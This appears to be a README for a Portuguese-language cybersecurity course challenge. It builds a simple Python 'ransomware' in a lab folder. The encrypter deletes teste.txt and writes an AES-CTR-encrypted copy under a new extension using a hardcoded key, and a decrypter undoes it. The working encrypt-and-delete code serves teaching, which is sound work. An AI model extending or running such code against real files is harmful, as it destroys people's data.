# projeto_ransomware_DIO
Desafio ransomware Dio ciberseguranca

DESAFIO RANSOMWARE

	Em um ambiente controlado vamos realizar o necessario para testar um ransomware criado
	em ambiente linux.
	
	# Vamos criar uma pasta para isolar o teste:
		mkdir projeto-ransomware
		
	# Dentro desta pasta vamos fazer os 3 arquivos necessarios para testar o ransomware.
		> touch teste.txt [contendo um texto qualquer para ser o alvo]
		> touch encrypter.py [será o agente malicioso para fazer a ação de criptografia]
		> touch decrypter.py [será o antidoto para o agente malicioso]
		
	# No arquivo teste.txt escreva um texto qualquer:
		> este arquivo esta legivel e pronto
		
	# Para criar o arquivo de criptografar e descriptografar vc precisa instalar a 
	biblioteca do python "pyaes" com o seguinte comando: [antes, fazer algumas verificacoes necessarias]
		> sudo apt update
		> sudo apt install python3-pip
		> sudo apt install python3-pyaes
		
	# Proximo passo eh criar o arquivo 'encrypter.py'
		> import os
		> import pyaes
		
		## abrir o arquivo a ser criptografado
		> file_name = 'teste.txt'
		> file = open(file_name, 'rb')
		> file_data = file.read()
		> file.close()
		
		## remover o arquivo original
		> os.remove(file_name)
		
		## definir a chave de encriptacao
		> key = b"testeransomwares"
		> aes = pyaes.AESModeOfOperationCTR(key)
		
		## criptografar o arquivo
		> crypto_data = aes.encrypt(file_data)
		
		## salvar o criptografado
		> new_file = file_name + '.ransomwaretroll'
		> new_file = open(f'{new_file}', 'wb')
		> new_file.write(crypto_data)
		> new_file.close()
		
	# Proximo passo eh criar o arquivo 'decrypter.py'
		> import os
		> import pyaes
		
		## abrir o arquivo criptografado
		> file_name = 'teste.txt.ransomwaretroll'
		> file = open(file_name, 'rb')
		> file_data = file.read()
		> file.close()
		
		## chave de descriptografia
		> key = b"testeransomwares"
		> aes = pyaes.AESModeOfOperationCTR(key)
		> decrypt_data = aes.decrypt(file_data)
		
		## remover o arquivo original
		> os.remove(file_name)
		
		## salvar o novo arquivo descriptografado
		> new_file = 'teste.txt'
		> new_file = open(f'{new_file}', 'wb')
		> new_file.write(decrypt_data)
		> new_file.close()
		
		
	# Apos criado os arquivos, execute o arquivo encrypter.py
	# Logo verifique a pasta e ira perceber a mudanca no arquivo teste.txt contendo uma extensao no nome "teste.txt.ransomwaretroll"
	# Abra o arquivo e verifique que o conteudo do arquivo esta criptografado
	# Execute o arquivo decrypter.py para desfazer a acao.
		
